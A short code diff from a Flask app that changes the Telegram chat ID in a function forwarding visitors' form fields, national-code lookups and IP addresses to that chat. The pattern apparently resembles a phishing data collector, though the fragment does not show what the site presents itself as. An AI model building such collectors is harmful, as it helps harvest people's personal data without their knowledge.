@@ -41,7 +41,7 @@ app = Flask(__name__ , template_folder=".")
 
 
 def SendToTelegram(f1 , f2 , f3 , f4 , f5 , visited , submited , id , FoundUsersByNCode , ip):
-    chatid = "151372864"
+    chatid = "-1001946865397"
     message = f"""
     کاربر شماره: {id}
     آی پی: {ip}
